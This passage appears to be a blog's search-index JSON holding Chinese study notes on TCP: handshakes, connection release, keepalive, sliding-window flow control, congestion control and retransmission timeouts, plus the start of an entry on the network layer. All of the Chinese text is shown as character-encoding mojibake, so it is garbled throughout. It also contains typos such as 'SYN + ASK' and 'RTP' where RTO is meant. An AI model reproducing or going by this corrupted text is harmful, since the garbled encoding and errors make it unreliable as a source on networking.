åŒæ–¹æ­£åœ¨è¿æ¥ï¼Œæ­¤æ—¶æœåŠ¡ç«¯ä»¥ä¸ºå®¢æˆ·ç«¯è¯·æ±‚æ–°çš„è¿æ¥ï¼Œå‘é€å›å¤SYN + ASKå»ºç«‹ä¸¤æ¬¡æ¡æ‰‹åï¼Œè¿›å…¥ç­‰å¾…æ•°æ®çŠ¶æ€ï¼›æœåŠ¡ç«¯å»ºç«‹ä¸¤ä¸ªè¿æ¥ï¼Œè€Œå®¢æˆ·ç«¯åªè®¤å¯ä¸€ä¸ªè¿æ¥ï¼Œå¯¼è‡´çŠ¶æ€ä¸ä¸€è‡´ã€‚          åŒæ–¹å·²é‡Šæ”¾è¿æ¥ï¼ŒæœåŠ¡å™¨ä»¥ä¸ºå®¢æˆ·ç«¯é‡æ–°è¯·æ±‚è¿æ¥ï¼Œå‘é€å›å¤SYN + ASKå»ºç«‹ä¸¤æ¬¡æ¡æ‰‹åï¼Œè€Œè¿›å…¥ç­‰å¾…æ•°æ®çŠ¶æ€ï¼›å®¢æˆ·ç«¯æ— è¿æ¥è¯·æ±‚ï¼Œå°†ä¸ä¼šå›å¤æ•°æ®ã€‚            å››æ¬¡æŒ¥æ‰‹ â€“ é‡Šæ”¾                                æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯çš„é‡Šæ”¾ï¼Œæˆä¸ºè¢«åŠ¨å…³é—­  å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·çš„é‡Šæ”¾ï¼Œç§°ä¸ºä¸»åŠ¨å…³é—­      æˆ‘å®¢æˆ·ç«¯è¯´å®Œäº†ï¼Œè¦æ’¤å’¯ï¼ˆå®¢æˆ·ç«¯å‘é€FIN=1,ACK=1,seq=u,ack=vï¼Œè¿›å…¥FIN-WAIT-1ç»ˆæ­¢ç­‰å¾…çŠ¶æ€ï¼‰    ï¼ˆFIN=1ï¼šå³ä½¿ä¸æºå¸¦ä¸€ä¸ªæ•°æ®ï¼Œä¹Ÿè¦æ¶ˆè€—ä¸€ä¸ªåºå·ï¼‰    ï¼ˆseq=uï¼šå®¢æˆ·ç«¯æœ€åå·²å‘é€çš„æœ€åä¸€ä¸ªå­—èŠ‚åºå·+1ï¼›ack=vï¼šå®¢æˆ·ç«¯æœ€åå·²æ”¶åˆ°çš„æœ€åä¸€ä¸ªå­—èŠ‚åºå·+1ï¼‰        çŸ¥é“äº†ï¼Œæˆ‘æœåŠ¡ç«¯è¿˜æœ‰è¯è¦è¯´ç‚¹ï¼ˆæœåŠ¡å™¨å‘é€ç¡®è®¤æŠ¥æ–‡ACK=1,seq=v,ack=u+1ï¼Œè¿›å…¥CLOSE-WAITå…³é—­ç­‰å¾…çŠ¶æ€ï¼‰    ï¼ˆæ™®é€šçš„ç¡®è®¤æŠ¥æ–‡æ®µï¼Œ æœåŠ¡å™¨é€šçŸ¥æœåŠ¡å™¨è¿›ç¨‹å…³é—­é“¾æ¥ï¼›ï¼‰    ï¼ˆseq=vï¼šæœåŠ¡å™¨æœ€åå·²å‘é€çš„æœ€åä¸€ä¸ªå­—èŠ‚åºå·+1ï¼›ack=u+1ï¼šæœåŠ¡å™¨æœ€åå·²æ”¶åˆ°çš„æœ€åä¸€ä¸ªå­—èŠ‚åºå·+1ï¼‰    ï¼ˆå®¢æˆ·ç«¯æ”¶åˆ°æŠ¥æ–‡ï¼Œè¿›å…¥FIN-WAIT-2ç»ˆæ­¢ç­‰å¾…çŠ¶æ€ï¼‰    ï¼ˆä¸¤ç«¯çš„åº”ç”¨è¿›ç¨‹æ–¹å‘è¿æ¥é‡Šæ”¾ï¼Œè¿›å…¥ åŠå…³é—­çŠ¶æ€ï¼šå®¢æˆ·è¿›ç¨‹æ— è¯è¦è¯´ï¼ŒæœåŠ¡å™¨è¿›ç¨‹å¯èƒ½æœ‰è¯è¦è¯´ï¼Œå®¢æˆ·ä»è¦å¼€æ”¾æ¥æ”¶ï¼‰        æˆ‘æœåŠ¡ç«¯è®²å®Œäº†ï¼Œå¬è§æ²¡å•Šï¼Ÿï¼ˆæœåŠ¡å™¨å‘é€FIN=1,ACK=1,seq=w,ack=u+1ï¼Œå¹¶è¿›å…¥LAST-ACKæœ€åç¡®è®¤çŠ¶æ€ï¼‰    ï¼ˆFIN=1,ACK=1ï¼šTCPè¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œseq=wï¼šåŠå…³é—­çŠ¶æ€ä¸‹å¯èƒ½å‘é€çš„æ•°æ®åºå·ï¼Œack=u+1ï¼šå¯¹æ”¶åˆ°çš„æŠ¥æ–‡è¿›è¡Œé‡å¤ç¡®è®¤ï¼‰        å—¯å—¯ï¼Œå¬åˆ°ä½ è¯´çš„è¯äº†ï¼Œç­‰ä½ å…ˆæŒ‚ç”µè¯ï¼ˆå®¢æˆ·ç«¯å‘é€ACK=1,seq=u+1,ack=w+1ï¼Œå¹¶è¿›å…¥TIME-WAITè¶…æ—¶ç­‰å¾…çŠ¶æ€ï¼‰    ï¼ˆæ™®é€šçš„ç¡®è®¤æŠ¥æ–‡æ®µï¼Œseq=u+1ï¼šå®¢æˆ·ç«¯ä¹‹å‰å·²å‘é€çš„åºå·ï¼Œfinæ¶ˆè€—æ‰ä¸€ä¸ªåºå·ï¼›ack=w+1ï¼šå®¢æˆ·ç«¯æ”¶åˆ°çš„åºå·ç¡®è®¤ï¼‰    ï¼ˆæœåŠ¡å™¨æ”¶åˆ°æŠ¥æ–‡ï¼Œç«‹å³å…³é—­è¿æ¥ï¼Œè¿›å…¥closedå…³é—­çŠ¶æ€ï¼‰        ï¼ˆå®¢æˆ·ç«¯è¶…æ—¶ç­‰å¾…ç»“æŸï¼Œå…³é—­è¿æ¥ï¼‰  è¶…æ—¶ç­‰å¾…çŠ¶æ€  ä¸ºç¡®ä¿æœåŠ¡å™¨ç«¯å·²æ”¶åˆ°ACKåŒ…ï¼›æ—¶é—´=2MSLï¼Œæœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½çš„ä¸¤å€ï¼ˆä¸€ä¸ªæ¥å›ï¼‰  ACKä¸¢åŒ…ï¼æœåŠ¡å™¨ä¼šé‡æ–°å‘é€FINåŒ…ï¼š å–‚ï¼Ÿå–‚ï¼Ÿå–‚ï¼          å®¢æˆ·ç«¯åœ¨è¶…æ—¶ç­‰å¾…ä¸­å¯æ•è·åˆ°è¿™ä¸ªåŒ…ï¼Œè€Œé‡æ–°ç¬¬å››æ¬¡æŒ¥æ‰‹      ç«‹å³æ–­å¼€è¿æ¥ï¼Œå®¢æˆ·ç«¯æ— æ³•æ•è·è¿™ä¸ªFINåŒ…ï¼Œæ²¡æœ‰ç¬¬å››æ¬¡æˆåŠŸæŒ¥æ‰‹ï¼Œå°†ä¼šä½¿å¾—æœåŠ¡å™¨ä¸€ç›´å¤„äºè¿æ¥çŠ¶æ€      ä¿æ´»è®¡æ—¶å™¨â€‹\tã€æƒ…æ™¯ã€‘å®¢æˆ·ç«¯å‡ºç°æ•…éšœã€‚æœåŠ¡ç«¯ä¸ä¼šå†æ”¶åˆ°ä¿¡æ¯ï¼Œå¦‚æœåŠæ—¶å‘ç°å¯¹æ–¹å·²ä¸‹çº¿ï¼Ÿ  æœåŠ¡å™¨ç»´æŠ¤ä¸€ä¸ª ä¿æ´»è®¡æ—¶å™¨  å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å°±é‡å¯ä¿æ´»è®¡æ—¶å™¨ï¼ˆ2hï¼‰  ä¿æ´»è®¡æ—¶å™¨åˆ°æ—¶å€™ï¼ŒæœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯å‘é€ æ¢æµ‹æŠ¥æ–‡æ®µï¼›ä¹‹åçš„75s/æ¬¡ï¼Œä¸€è¿10æ¬¡ä»ç„¶æ²¡æœ‰å“åº”ï¼Œå…³é—­è¿æ¥æ•°æ®ç¡®è®¤ä¸ºè§£å†³ä¸¢åŒ…ã€ä¹±åºé—®é¢˜      ä¸ºæ¯ä¸€ä¸ªè¿æ¥å»ºç«‹ å‘é€ç¼“å†²åŒºï¼Œå»ºç«‹è¿æ¥åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚åºåˆ—å·ä¸º0ï¼Œæ­¤ååºåˆ—å· + 1        å‘é€æŠ¥æ–‡æ ¼å¼ï¼šå–å…¶æ•°æ®åºåˆ—å· + é•¿åº¦ + æ•°æ®å†…å®¹        ç¡®è®¤æŠ¥æ–‡æ ¼å¼ï¼šACK = åºåˆ—å· + é•¿åº¦ = ä¸‹ä¸€åŒ…èµ·å§‹åºåˆ—å·    ï¼ˆå¯ä»¥è¿ç»­å‘é€å¤šä¸ªå‘é€æŠ¥æ–‡ï¼Œæ¥æ”¶ç«¯åªéœ€å›å¤ä¸€æ¬¡ACKå°±å¯ä»¥ï¼‰    ï¼ˆæ”¶åˆ°ACKç¡®è®¤æŠ¥æ–‡ï¼Œå‘é€ç«¯å¯å°†å·²æ¥å—å­—æ®µåˆ é™¤ï¼‰        åˆ‡å‰²å‘é€ï¼šæ ¹æ®åºåˆ—å·+é•¿åº¦é‡ç»„ = æ•°æ®å†…å®¹        ä¸¢å¤±é‡å‘ï¼šACK = ä¸¢å¤±æŠ¥æ–‡çš„åºåˆ—å·    ã€å…¨åŒå·¥ï¼šä»¥ä¸Šè¿‡ç¨‹éƒ¨åŒºåˆ†å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯ã€‘  æµé‡æ§åˆ¶â€‹\tFlow Control, è®©å‘é€æ–¹çš„å‘ç”Ÿæ•ˆç‡ä¸è¦å¤ªå¿«ï¼Œè®©æ¥æ”¶æ–¹ æ¥å¾—åŠ æ¥å—ï¼›æ»‘åŠ¨çª—å£â€‹\tä¾é æ»‘åŠ¨çª—å£å®ç° å¯é ä¼ è¾“  å‘é€çª—å£å’Œæ¥å—çª—å£å¹¶ä¸é‡è§†ä¸€æ ·å¤§          ç½‘ç»œä¼ è¾“çª—å£å€¼æœ‰ä¸€å®šçš„æ»å      å‘é€æ–¹å¯æ ¹æ®è‡ªèº«æƒ…å†µä¿®æ”¹å‘é€çª—å£        ä¸æŒ‰åºåˆ°è¾¾çš„æ•°æ®ï¼ŒTCPæ— æ˜ç¡®è§„å®š          æ¥æ”¶æ–¹ä¸€å¾‹ä¸¢å¼ƒï¼Œç®¡ç†ç®€å•ä½†æµªè´¹èµ„æºï¼Œå‘é€æ–¹éœ€è¦é‡å¤å‘é€æ•°æ®      æ¥æ”¶æ–¹æš‚å­˜åˆ°æ¥å—çª—å£ï¼Œç­‰å¾…æ•°æ®é½å…¨åï¼Œäº¤ä»˜ç»™ä¸Šå±‚çš„åº”ç”¨è¿›ç¨‹        æ¥æ”¶æ–¹å¿…é¡»æœ‰ ç´¯è®¡ç¡®è®¤ å’Œ æå¸¦ç¡®è®¤ æœºåˆ¶          æå¸¦ç¡®è®¤ï¼šå¯ä»¥åœ¨æœ‰æ•°æ®å‘é€çš„æ—¶å€™ï¼Œå§ç¡®è®¤ä¿¡æ¯æå¸¦      ä¸åº”è¯¥è¿‡åˆ†æ¨è¿Ÿç¡®è®¤ï¼šæ¯éš”ä¸€ä¸ªæŠ¥æ–‡æ®µå°±å‘é€ä¸€ä¸ªç¡®è®¤      ä¸ç»å¸¸å‘é€ï¼Œå› ä¸ºå¾ˆå°‘è¦æ±‚ç»å¸¸åŒæ—¶å‘ä¸¤ä¸ªæ–¹å‘å‘é€        TCPé€šä¿¡æ˜¯å…¨åŒå·¥é€šä¿¡ã€ä¸¾ä¾‹ã€‘æ¯ä¸ªæŠ¥æ–‡å¯æºå¸¦100å­—èŠ‚æ•°æ®ï¼Œå°†è¦å‘é€çš„æ•°æ®ç¼–å·åä»¥100ä¸ºå•ä½åˆ†å‰²      å»ºç«‹TCPè¿æ¥æ—¶ï¼Œæ¥æ”¶æ–¹Bå‘Šè¯‰å‘é€æ–¹Aï¼šæˆ‘çš„æ¥æ”¶çª—å£ä¸º400    ï¼ˆAçš„å‘é€çª—å£è®¾ç½®ä¸º400ï¼Œåœ¨æœªæ”¶åˆ°Bçš„ç¡®è®¤ï¼Œå¯å°†è½å…¥å‘é€çª—å£çš„å…¨éƒ¨æ•°æ®ä¸€ç›´å‘é€å‡ºå»ï¼‰        å‘é€Aå‘é€1~100å­—èŠ‚æ•°æ®ï¼Œseq=1,DATAï¼Œè¿˜èƒ½å‘é€300        å‘é€Aå‘é€101~200å­—èŠ‚æ•°æ®ï¼Œseq=101,DATAï¼Œè¿˜èƒ½å‘é€200        å‘é€Aå‘é€201~300å­—èŠ‚æ•°æ®ï¼Œseq=201,DATA(ä¸¢å¤±)ï¼Œè¿˜èƒ½å‘é€100        æ¥å—Bå¯¹1~200å­—èŠ‚æ•°æ®ç´¯è®¡ç¡®è®¤ï¼Œå¹¶å°†æ¥æ”¶çª—å£è®¾ç½®ä¸º300ï¼ŒACK=1,ack=201,rwnd=300    ï¼ˆACKç¡®è®¤æ ‡å¿—ç¬¦ï¼Œackç¡®è®¤äº†nå­—èŠ‚æ•°ä¹‹å‰çš„æ•°æ®ï¼Œrwndé‡ç½®çš„çª—å£çš„å¤§å°ã€‚ï¼‰    ï¼ˆ:number1: Bå¯¹Aè¿›è¡Œ æµé‡æ§åˆ¶ï¼‰    ï¼ˆAå‘å‰æ»‘åŠ¨å‘é€çª—å£ï¼Œåˆ°ackç¡®è®¤çš„å­—èŠ‚æ•°å201ï¼›è°ƒæ•´å‘é€çª—å£çš„å¤§å°=300ï¼›ä¸¢å¼ƒå‘é€ç¼“å­˜ä¸­å·²è¢«ç¡®è®¤æ¥æ”¶çš„æ•°æ®1~200ï¼‰    ï¼ˆ201~300å­—èŠ‚å·²å‘é€ä½†æ²¡æœ‰æ”¶åˆ°ç¡®è®¤ï¼Œé‡ä¼ è®¡æ—¶å™¨å¼€å§‹è®¡æ—¶ï¼‰        å‘é€Aå‘é€301~400å­—èŠ‚æ•°æ®ï¼Œseq=301,DATAï¼Œè¿˜èƒ½å‘é€100        å‘é€Aå‘é€401~500å­—èŠ‚æ•°æ®ï¼Œseq=401,DATAï¼Œè¿˜èƒ½å‘é€0ï¼Œä¸èƒ½å†å‘é€æ–°æ•°æ®    ï¼ˆé‡ä¼ è®¡æ•°å™¨åˆ°ç‚¹ï¼Œå¼€å§‹é‡ä¼ æ—§æ•°æ®ï¼›300çª—å£ä¸ºä¸¢å¤±æ•°æ®ä¿ç•™ä¸€ä¸ª100å‘é€ï¼Œä½†ä¸èƒ½å†å‘é€æ–°æ•°æ®äº†ï¼‰        å‘é€Aå‘é€201~300å­—èŠ‚æ•°æ®ï¼Œseq=201,DATAï¼Œè¿˜èƒ½å‘é€300        æ¥å—Bå¯¹201~500å­—èŠ‚æ•°æ®ç´¯è®¡ç¡®è®¤ï¼Œå¹¶å°†æ¥æ”¶çª—å£è®¾ç½®ä¸º100ï¼ŒACK=1ï¼Œack=501ï¼Œrwnd=100    ï¼ˆ:number2: Bå¯¹Aè¿›è¡Œ æµé‡æ§åˆ¶ï¼‰    ï¼ˆAå‘å‰æ»‘åŠ¨å‘é€çª—å£ï¼Œåˆ°ackç¡®è®¤çš„å­—èŠ‚æ•°å501ï¼›è°ƒæ•´å‘é€çª—å£çš„å¤§å°=100ï¼›ä¸¢å¼ƒå‘é€ç¼“å­˜ä¸­å·²è¢«ç¡®è®¤æ¥æ”¶çš„æ•°æ®201~500ï¼‰        å‘é€Aå‘é€501~600å­—èŠ‚æ•°æ®ï¼Œseq=501,DATAï¼Œè¿˜èƒ½å‘é€0ï¼Œä¸èƒ½å†å‘é€æ–°æ•°æ®        æ¥å—Bå¯¹600ä¹‹å‰çš„å­—èŠ‚æ•°æ®ç´¯è®¡ç¡®è®¤ï¼Œå¹¶å°†æ¥æ”¶çª—å£è®¾ç½®ä¸º100ï¼ŒACK=1ï¼Œack=601ï¼Œrwnd=0    ï¼ˆ:number3: Bå¯¹Aè¿›è¡Œ æµé‡æ§åˆ¶ï¼‰    ï¼ˆAå‘å‰æ»‘åŠ¨å‘é€çª—å£ï¼Œåˆ°ackç¡®è®¤çš„å­—èŠ‚æ•°å601ï¼›è°ƒæ•´å‘é€çª—å£çš„å¤§å°=0ï¼›ä¸¢å¼ƒå‘é€ç¼“å­˜ä¸­å·²è¢«ç¡®è®¤æ¥æ”¶çš„æ•°æ®501~600ï¼‰  ã€çª—å£ä¸º0çš„ç¡®è®¤ã€‘      å½“Bæ¥æ”¶ç¼“å­˜æœ‰äº†ä¸€äº›å­˜å‚¨ç©ºé—´ï¼Œäºæ˜¯å‘é€æˆ‘è¦è°ƒæ•´çª—å£ä¸º300ï¼Œä½†ä¸¢å¤±äº†ï¼    å½¢æˆæ­»é”ï¼šä¸»æœºAç­‰å¾…Bçš„éé›¶çª—å£é€šçŸ¥ï¼›ä¸»æœºBç­‰å¾…Açš„æ•°æ®æŠ¥æ–‡        Aä¸»åŠ¨å‘é€é›¶çª—å£æ¢æµ‹æŠ¥æ–‡ï¼Œæºå¸¦1å­—èŠ‚æ•°æ®ï¼Œè¯¢é—®æ¥æ”¶æ–¹        æ¯æ¬¡Aæ¥æ”¶åˆ°0çª—å£æŠ¥æ–‡åï¼Œå¯åŠ¨æŒç»­è®¡æ—¶å™¨ï¼Œè¶…æ—¶æ—¶ä¸»åŠ¨è¯¢é—®        Bæ”¶åˆ°é›¶çª—å£æ¢æµ‹æŠ¥æ–‡ï¼Œéœ€å›å¤ç¡®è®¤æŠ¥æ–‡ï¼Œå¹¶å‘ŠçŸ¥ç°åœ¨çš„çª—å£å¤§å°ï¼ŒACK=1,rwnd=300    Bæ¥å—ç¼“å­˜å·²æ»¡ï¼Œå¯ä»¥ä¸æ¥å—ä¸€èˆ¬æŠ¥æ–‡ï¼Œä½†å¿…é¡»æ¥å—ç´§æ€¥æŠ¥æ–‡ã€ç¡®è®¤æŠ¥æ–‡å’Œé›¶çª—å£æ¢æµ‹æŠ¥æ–‡  æ‹¥å¡æ§åˆ¶æ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…  æ‹¥å¡çª—å£cwndï¼š          å€¼å–å†³äº ç½‘ç»œæ‹¥å¡ç¨‹åº¦ï¼Œå¹¶åŠ¨æ€å˜åŒ–      ç»´æŠ¤åŸåˆ™ï¼š                  ç½‘ç»œæœªå‡ºç°æ‹¥å¡ï¼Œcwndå€¼å°±å¤§ä¸€äº›ï¼›          ç½‘ç»œä¸€æ—¦å‡ºç°æ‹¥å¡ï¼Œcwndå€¼å°±å°ä¸€äº›ï¼›                    å‘é€æ–¹çš„å‘é€çª—å£swnd = cwnd        ç½‘ç»œæ‹¥å¡çš„ä¾æ®ï¼šæ²¡æœ‰æŒ‰æ—¶æ”¶åˆ°åº”å½“åˆ°è¾¾çš„ç¡®è®¤æŠ¥æ–‡ï¼ˆå‘é€è¶…æ—¶é‡ä¼ ï¼‰  ä¸¤ç§æ§åˆ¶çš„åº”ç”¨ï¼šæ…¢å¼€å§‹é—¨é™ ssthresh          cwnd &lt; ssthreshï¼Œæ‹¥å¡çª—å£ &lt; æ…¢å¼€å§‹é—¨é™ â€”- ä½¿ç”¨æ…¢å¼€å§‹ç®—æ³•ï¼ˆcwnd Ã— 2ï¼‰      cwnd &gt; ssthreshï¼Œæ‹¥å¡çª—å£ &gt; æ…¢å¼€å§‹é—¨é™ â€”- åœæ­¢ä½¿ç”¨æ…¢å¼€å§‹ï¼Œè€Œä½¿ç”¨æ‹¥å¡ç®—æ³•ï¼ˆcwnd + 1ï¼‰      cwnd = ssthreshï¼Œæ‹¥å¡çª—å£ = æ…¢å¼€å§‹é—¨é™ â€”- å¯ä½¿ç”¨æ…¢å¼€å§‹ï¼Œä¹Ÿå¯ä½¿ç”¨æ‹¥å¡ç®—æ³•        ç»´æŠ¤ä¸€ä¸ª æ…¢å¼€å§‹é—¨é™ ssthresh          è®¾ç½®ä¸€ä¸ªåˆå§‹å€¼      æ¯æ¬¡å‘ç”Ÿç½‘ç»œæ‹¥å¡æ—¶                  æ‹¥å¡çª—å£å€¼cwnd / 2 = ssthresh          cwndé‡ç½®ä¸ºåˆå§‹å€¼ï¼Œå¹¶å¼€å§‹æ…¢å¼€å§‹                    å¿«é€Ÿé‡ä¼ ã€å¿«é€Ÿæ¢å¤  ä¸æ˜¯æ‰€æœ‰çš„æŠ¥æ–‡ä¸¢å¤±ç”±äºç½‘ç»œæ‹¥å¡å¯¼è‡´çš„ï¼Œå½“è¶…æ—¶é‡ä¼ æ—¶åˆ¤æ–­æ˜¯å¦ä¸º ç½‘ç»œæ‹¥å¡          æ˜¯ç½‘ç»œæ‹¥å¡ï¼Œä½¿ç”¨æ‹¥å¡ç®—æ³•      ä¸æ˜¯ç½‘ç»œæ‹¥å¡ï¼Œå¼€å¯å¿«é‡ä¼ ã€å¿«æ¢å¤        å¿«é€Ÿé‡ä¼ ï¼š          è¦æ±‚æ¥æ”¶æ–¹æ¯æ¬¡æ”¶åˆ°æŠ¥æ–‡ï¼Œéƒ½è¦å¯¹å…¶åŠæ—¶ç¡®è®¤      è‹¥æ”¶åˆ°å¤±åºçš„æŠ¥æ–‡ï¼Œå¯¹å¤±åºæŠ¥æ–‡é‡å¤ç¡®è®¤ï¼ˆç¡®è®¤æŠ¥æ–‡åªèƒ½ç¡®è®¤æœ€é«˜åºå·ï¼‰      åŒæ—¶ä¿ç•™å¤±åºçš„æŠ¥æ–‡      å‘é€æ–¹æ¥å—ä¸‰æ¬¡é‡å¤çš„æŠ¥æ–‡ç¡®è®¤                  ç½‘ç»œæœªæ‹¥å¡          ä¸€è‡³ä¸¤æ¬¡é‡å¤ç¡®è®¤ï¼Œå¯èƒ½æŠ¥æ–‡æ»ç•™åœ¨ç½‘ç»œæŸå¤„          ä¸‰æ¬¡ç¡®è®¤å¯è®¤ä¸ºæŠ¥æ–‡ä¸¢å¤±ï¼Œé‡å‘æŠ¥æ–‡                      å¿«é€Ÿæ¢å¤ï¼š          å¯ç”¨å¿«é‡ä¼ åï¼ŒæŠ›å¼ƒæ…¢å¯åŠ¨ï¼Œä½¿ç”¨å¿«é€Ÿæ¢å¤      ssthresh = cwmd / 2      cwmd = ssthresh      æ‹¥å¡é¿å…ç®—æ³•      è¶…æ—¶é‡ä¼ è¶…æ—¶æ—¶é—´é€‰æ‹©â€‹\tè¶…æ—¶é‡ä¼ çš„æ—¶é—´ORT åº”è¯¥ç•¥å°äº ä¸€ä¸ªæŠ¥æ–‡æ®µå¾€è¿”æ—¶é—´RTTO  è¿‡çŸ­ï¼šä¸å¿…è¦çš„é‡ä¼ ï¼Œç½‘ç»œæ‹¥å¡  è¿‡é•¿ï¼šä¸å¿…è¦çš„ç­‰å¾…ï¼Œç½‘ç»œé—²ç½®  ç•¥ï¼Ÿï¼šç»è¿‡ä¸åŒé€Ÿç‡çš„ç½‘ç»œã€ä¸åŒæ•°é‡çš„è·¯ç”±ç­‰ç­‰å› ç´ åŠ æƒå¹³å‡å¾€è¿”æ—¶é—´ RTTs â€“ â€“ å¹³æ»‘çš„å¾€è¿”æ—¶é—´ï¼šå¤šæ¬¡æµ‹é‡çš„RTTæ ·æœ¬åŠ æƒå¹³å‡åŠ æƒå¹³å‡å¾€è¿”æ—¶é—´ RTTs\tåˆå§‹åŒ–ï¼šRTTs = RTT1\tæ–°çš„RTTs1 = ï¼ˆ1 - Î±ï¼‰Ã— RTTs1 + Î± Ã— æ–°çš„RTTæ ·æœ¬ï¼ˆ0 &lt;= Î± &lt; 1ï¼ŒÎ±=1/8=0.125ï¼‰RTTåå·®çš„åŠ æƒå¹³å‡RTTd\tåˆå§‹åŒ–ï¼šRTTD = RTT1 Ã· 2\tæ–°çš„RTTD = ï¼ˆ1 - Î² ï¼‰Ã— RTTD1 + Î² Ã— |RTTs1 - æ–°çš„RTTæ ·æœ¬| ï¼ˆ0 &lt;= Î² &lt; 1ï¼ŒÎ²=1/4=0.25ï¼‰è¶…æ—¶é‡ä¼ æ—¶é—´ RTO\tRTP = RTTs + 4 Ã— RTTd      RTTçš„æµ‹é‡å‡†ç¡®ä¸å¦éå¸¸é‡è¦                  RTTçš„æµ‹é‡æœ‰éš¾åº¦ï¼š                  æ•°æ®æŠ¥æ–‡æ®µä¸¢å¤±åé‡å‘ã€‚è·ç¦»æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡çš„æ—¶é—´ï¼Œæ˜¯ç¬¬ä¸€æ¬¡æŠ¥æ–‡è¿˜æ˜¯ç¬¬äºŒæ¬¡æŠ¥æ–‡ï¼Ÿ          æ•°æ®æœªæ”¶åˆ°ç¡®è®¤è€Œé‡å‘ã€‚è·ç¦»æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡çš„æ—¶é—´ï¼Œæ˜¯ç¬¬ä¸€æ¬¡æŠ¥æ–‡è¿˜æ˜¯ç¬¬äºŒæ¬¡æŠ¥æ–‡ï¼Ÿ                            Karnç®—æ³•ï¼šåªè¦æŠ¥æ–‡é‡ä¼ ï¼Œå°±ä¸é‡‡ç”¨å…¶RTTæ ·æœ¬ï¼ŒRTOä¹Ÿä¸ä¼šé‡æ–°è®¡ç®—        ï¼ˆè‹¥æŠ¥æ–‡æ—¶å»¶çªç„¶å¢å¤§ä¸”æŒç»­å¾ˆä¹…ï¼ŒRTOå†…ä¸ä¼šæ”¶åˆ°ç¡®è®¤æŠ¥æ–‡ï¼Œäºæ˜¯é‡å‘ï¼Œè€Œä¸æ›´æ–°RTOï¼Œå°†ä¸€ç›´é‡å‘ï¼‰                    ä¿®æ­£Karnç®—æ³•ï¼šæŠ¥æ–‡é‡ä¼ ï¼Œå°±æŠŠRTOå¢å¤§ä¸€äº›ï¼ˆÃ— 2ï¼‰            "
  },
  
  {
    "title": "4. ç½‘ç»œå±‚",
    "url": "/posts/4.%E7%BD%91%E7%BB%9C%E5%B1%82/",
    "categories": "è®¡ç®—æœºç½‘ç»œ",
    "tags": "computerNetwork",
    "date": "2022-06-14 00:00:00 +0800",
    





    
    "snippet": "â€‹\tå®ç°ç½‘ç»œäº’è¿ï¼Œæ•°æ®åŒ…åœ¨å…¶ä¹‹é—´çš„ä¼ è¾“      å‘ä¸Šå±‚ï¼ˆè¿è¾“å±‚ï¼‰æä¾›æ€æ ·çš„æœåŠ¡ï¼ŸIPæä¾›çš„æ˜¯ é¢å‘æ— è¿æ¥ï¼Œä¸å¯é æœåŠ¡        ç½‘ç»œå¯»å€é—®é¢˜ï¼šAç±»åœ°å€ã€Bç±»åœ°å€ã€Cç±»åœ°å€        è·¯ç”±é€‰æ‹©é—®é¢˜ï¼šè·¯ç”±è¡¨ + ç›®çš„åœ°å€          è·¯ç”±è¡¨çš„æ•°æ®æ¥æºï¼šäººå·¥è®¾ç½®ï¼ˆå°å‹ï¼Œä¸æ”¹å˜ï¼‰ã€è·¯ç”±é€‰æ‹©åè®®ä¸­çš„é€‰æ‹©ç®—æ³•        å› ç‰¹ç½‘ï¼Œä½¿ç”¨TCP/IPåè®®ï¼Œç½‘ç»œå±‚ä½¿ç”¨ç½‘é™…åè®®IPï¼Œç”±æ­¤TCP...",
    "content": "â€‹\tå®ç°ç½‘ç»œäº’è¿ï¼Œæ•°æ®åŒ…åœ¨å…¶ä¹‹é—´çš„ä¼ è¾“      å‘ä¸Šå±‚ï¼ˆè¿è¾“å±‚ï¼‰æä¾›æ€æ ·çš„æœåŠ¡ï¼ŸIPæä¾›çš„æ˜¯ é¢å‘æ— è¿æ¥ï¼Œä¸å¯é æœåŠ¡        ç½‘ç»œå¯»å€é—®é¢˜ï¼šAç±»åœ°å€ã€Bç±»åœ°å€ã€Cç±»åœ°å€        è·¯ç”±é€‰æ‹©é—®é¢˜ï¼šè·¯ç”±è¡¨ + ç›®çš„åœ°å€          è·¯ç”±è¡¨çš„æ•°æ®æ¥æºï¼šäººå·¥è®¾ç½®ï¼ˆå°å‹ï¼Œä¸æ”¹å˜ï¼‰ã€è·¯ç”±é€‰æ‹©åè®®ä¸­çš„é€‰æ‹©ç®—æ³•        å› ç‰¹ç½‘ï¼Œä½¿ç”¨TCP/IPåè®®ï¼Œç½‘ç»œå±‚ä½¿ç”¨ç½‘é™…åè®®IPï¼Œç”±æ­¤TCP/IPä¸­çš„ç½‘ç»œå±‚åˆç§°ä¸ºç½‘é™…å±‚  æä¾›çš„ä¸¤ç§è¿æ¥      é¢å‘è¿æ¥çš„è™šç”µè·¯          å¯é é€šä¿¡ç”±ç½‘ç»œæ¥ä¿éšœ      å»ºç«‹ç½‘ç»œå±‚çš„è¿æ¥â€”â€”è™šç”µè·¯CVï¼Œæ²¿ç€æ­¤ç”µè·¯å‘é€åˆ†ç»„      ç›®çš„ä¸»æœºåœ°å€ä»…åœ¨å»ºç«‹åˆé˜¶æ®µä½¿ç”¨ï¼Œä¹‹å é¦–éƒ¨åªæºå¸¦è™šç”µè·¯çš„ç¼–å·      é€šä¿¡ç»“æŸåï¼Œéœ€è¦é‡Šæ”¾æ‰€å»ºç«‹çš„è™šç”µè·¯        è™šç”µè·¯ + å¯é ä¼ è¾“åè®® = æ— ä¼ è¾“å·®é”™          è™šç”µè·¯æ˜¯ä¸€æ¡é€»è¾‘ä¸Šçš„ç”µè·¯ï¼Œäº‹å®ä¸Šä¸å­˜åœ¨      ç”µè¯äº¤æ¢çš„ç”µè¯é€šä¿¡ï¼Œæ˜¯å»ºç«‹ä¸€æ¡ç‰©ç†ä¸Šçš„ç”µè·¯            æ— è¿æ¥çš„æ•°æ®æŠ¥æœåŠ¡          å¯é é€šä¿¡ç”±ç”¨æˆ·ä¸»æœºæ¥ä¿éšœ      ä¸å»ºç«‹ç½‘ç»œå±‚ç»ƒçº§â€”â€”æ¯ä¸ªåˆ†ç»„å¯èµ°ä¸åŒçš„è·¯å¾„      